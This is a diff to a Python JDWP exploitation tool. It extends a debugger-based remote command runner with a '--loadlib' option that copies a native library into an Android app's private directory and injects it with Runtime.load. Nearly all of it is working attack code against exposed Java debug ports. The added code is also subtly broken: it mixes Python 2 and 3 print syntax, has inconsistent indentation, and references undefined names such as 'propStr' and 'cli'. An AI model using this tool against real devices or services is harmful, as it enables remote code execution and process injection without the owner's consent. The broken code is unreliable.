@@ -7,6 +7,8 @@
 #
 # And special cheers to @lanjelot
 #
+# loadlib option by @ikoz
+#
 
 import socket
 import time
@@ -487,11 +489,24 @@ def runtime_exec(jdwp, args):
     rId, tId, loc = ret
     print(("[+] Received matching event from thread %#x" % tId))
 
-    jdwp.clear_event(EVENT_BREAKPOINT, rId)
+	# time.sleep(1)
+    # jdwp.clear_event(EVENT_BREAKPOINT, rId)
 
     # 5. Now we can execute any code
     if args.cmd:
-        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd.encode('utf8','ignore'))
+        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd)
+    elif args.loadlib:
+        packagename = getPackageName(jdwp, tId)
+        tmpLocation = "/data/local/tmp/" + args.loadlib
+        dstLocation = "/data/data/" + packagename + "/" + args.loadlib
+        command = "cp " + tmpLocation + " " + dstLocation
+        print("[*] Copying library from " + tmpLocation + " to " + dstLocation)
+        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], command)
+        time.sleep(2)
+        print("[*] Executing Runtime.load(" + dstLocation + ")")
+        runtime_load_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], dstLocation)
+        time.sleep(2)
+        print("[*] Library should now be loaded")
     else:
         # by default, only prints out few system properties
         runtime_exec_info(jdwp, tId)
@@ -575,6 +590,9 @@ def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, comma
     # This function will invoke command as a payload, which will be running
     # with JVM privilege on host (intrusive).
     #
+    if isinstance(command, str):
+        command = command.encode("utf8", "ignore")
+
     print(("[+] Selected payload '%s'" % command))
 
     # 1. allocating string containing our command to exec()
@@ -616,6 +634,98 @@ def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, comma
 
     return True
 
+def getPackageName(jdwp, threadId):
+    #
+    # This function will invoke ActivityThread.currentApplication().getPackageName()
+    #
+    activityThreadClass = jdwp.get_class_by_name("Landroid/app/ActivityThread;")
+    if activityThreadClass is None:
+        print("[-] Cannot find class android.app.ActivityThread")
+        return False
+
+    contextWrapperClass = jdwp.get_class_by_name("Landroid/content/ContextWrapper;")
+    if contextWrapperClass is None:
+        print("[-] Cannot find class android.content.ContextWrapper")
+        return False
+
+    jdwp.get_methods(activityThreadClass["refTypeId"])
+    jdwp.get_methods(contextWrapperClass["refTypeId"])
+
+    getContextMeth = jdwp.get_method_by_name("currentApplication")
+    if getContextMeth is None:
+        print("[-] Cannot find method ActivityThread.currentApplication()")
+        return False
+
+    buf = jdwp.invokestatic(
+        activityThreadClass["refTypeId"], threadId, getContextMeth["methodId"])
+    if buf[0] != chr(TAG_OBJECT):
+        print("[-] Unexpected returned type: expecting Object")
+        return False
+    rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
+    if rt is None:
+        print "[-] Failed to invoke ActivityThread.currentApplication()"
+        return False
+
+    # 3. find getPackageName() method
+    getPackageNameMeth = jdwp.get_method_by_name("getPackageName")
+    if getPackageNameMeth is None:
+        print("[-] Cannot find method ActivityThread.currentApplication().getPackageName()")
+        return False
+
+    # 4. call getPackageNameMeth()
+    buf = jdwp.invoke(rt, threadId, contextWrapperClass["refTypeId"], getPackageNameMeth["methodId"])
+    if buf[0] != chr(TAG_STRING):
+        print("[-] %s: Unexpected returned type: expecting String" % propStr)
+    else:
+        retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
+        res = cli.solve_string(jdwp.format(jdwp.objectIDSize, retId))
+        print("[+] getPackageMethod(): '%s'" % (res))
+
+    return "%s" % res
+
+
+def runtime_load_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, library):
+    #
+    # This function will run Runtime.load() with library as a payload
+    #
+
+    # print("[+] Selected payload '%s'" % library)
+
+    # 1. allocating string containing our command to exec()
+    cmdObjIds = jdwp.createstring( library )
+    if len(cmdObjIds) == 0:
+        print("[-] Failed to allocate library string")
+        return False
+    cmdObjId = cmdObjIds[0]["objId"]
+    # print("[+] Command string object created id:%x" % cmdObjId)
+
+    # 2. use context to get Runtime object
+    buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
+    if buf[0] != chr(TAG_OBJECT):
+        print("[-] Unexpected returned type: expecting Object")
+        return False
+    rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
+
+    if rt is None:
+        print "[-] Failed to invoke Runtime.getRuntime()"
+        return False
+    # print("[+] Runtime.getRuntime() returned context id:%#x" % rt)
+
+    # 3. find load() method
+    loadMeth = jdwp.get_method_by_name("load")
+    if loadMeth is None:
+        print("[-] Cannot find method Runtime.load()")
+        return False
+    # print("[+] found Runtime.load(): id=%x" % loadMeth["methodId"])
+
+    # 4. call exec() in this context with the alloc-ed string
+    data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmdObjId)]
+    jdwp.invokeVoid(rt, threadId, runtimeClassId, loadMeth["methodId"], *data)
+
+    print("[+] Runtime.load(%s) probably successful" % library)
+
+    return True
+
 
 def str2fqclass(s):
     i = s.rfind(b'.')
@@ -639,6 +749,8 @@ if __name__ == "__main__":
                         default="java.net.ServerSocket.accept", help="Specify full path to method to break on")
     parser.add_argument("--cmd", dest="cmd", type=str, metavar="COMMAND",
                         help="Specify command to execute remotely")
+    parser.add_argument("--loadlib", dest="loadlib", type=str, metavar="LIBRARYNAME",
+                        help="Specify library to inject into process load")
 
     args = parser.parse_args()
 
